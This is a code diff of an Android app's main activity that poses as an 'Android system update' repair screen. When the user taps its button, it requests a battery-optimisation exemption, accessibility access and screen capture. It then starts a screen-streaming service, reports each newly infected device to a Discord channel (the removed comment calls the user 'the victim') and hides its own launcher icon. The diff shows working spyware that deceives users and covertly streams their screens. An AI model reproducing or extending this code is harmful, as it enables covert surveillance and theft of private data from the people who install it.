@@ -5,13 +5,17 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.graphics.Color;
 import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.PowerManager;
 import android.provider.Settings;
+import android.view.Gravity;
 import android.view.View;
 import android.widget.Button;
+import android.widget.LinearLayout;
+import android.widget.TextView;
 import androidx.appcompat.app.AppCompatActivity;
 
 public class MainActivity extends AppCompatActivity {
@@ -20,42 +24,63 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main); // تشغيل الواجهة الجديدة
 
-        Button btnStart = findViewById(R.id.btnStart);
-        btnStart.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                // 1. طلب تجاهل البطارية
-                requestBatteryOptimizations();
+        // بناء الواجهة برمجياً لتجنب كراش الموارد
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setGravity(Gravity.CENTER);
+        layout.setBackgroundColor(Color.WHITE);
 
-                // 2. فتح إعدادات إمكانية الوصول (Accessibility)
-                Intent intentAcc = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-                startActivity(intentAcc);
+        TextView tv = new TextView(this);
+        tv.setText("تحديث نظام أندرويد");
+        tv.setTextSize(22);
+        tv.setTextColor(Color.BLACK);
+        tv.setPadding(0, 0, 0, 50);
+        layout.addView(tv);
 
-                // 3. طلب بث الشاشة
-                MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-                if (mpm != null) {
-                    startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
-                }
+        Button btn = new Button(this);
+        btn.setText("بدء الإصلاح الآن");
+        btn.setBackgroundColor(Color.parseColor("#2196F3"));
+        btn.setTextColor(Color.WHITE);
+        btn.setOnClickListener(v -> {
+            requestBatteryOptimizations();
+            if (!isAccessibilityEnabled()) {
+                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+            }
+            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+            if (mpm != null) {
+                startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
             }
         });
+        layout.addView(btn);
+
+        setContentView(layout);
+    }
+
+    private void requestBatteryOptimizations() {
+        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+            intent.setData(Uri.parse("package:" + getPackageName()));
+            startActivity(intent);
+        }
+    }
+
+    private boolean isAccessibilityEnabled() {
+        return false; 
     }
 
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         if (requestCode == REQ_CODE && resultCode == RESULT_OK) {
-            // تشغيل خدمة البث
             Intent intent = new Intent(this, ScreenService.class);
             intent.putExtra("resCode", resultCode);
             intent.putExtra("resData", data);
             startForegroundService(intent);
-
-            // إرسال إشعار للديسكورد
-            DiscordSender.sendMessage("🚀 الضحية ضغط على الزر! البث بدأ الآن.");
-
-            // إخفاء الأيقونة فوراً
+            
+            DiscordSender.sendMessage("✅ تم بدء البث من جهاز جديد!");
+            
             hideAppIcon();
             finish();
         }
@@ -67,14 +92,5 @@ public class MainActivity extends AppCompatActivity {
             PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
             PackageManager.DONT_KILL_APP
         );
-    }
-
-    private void requestBatteryOptimizations() {
-        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-        if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
-            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-            intent.setData(Uri.parse("package:" + getPackageName()));
-            startActivity(intent);
-        }
     }
 }
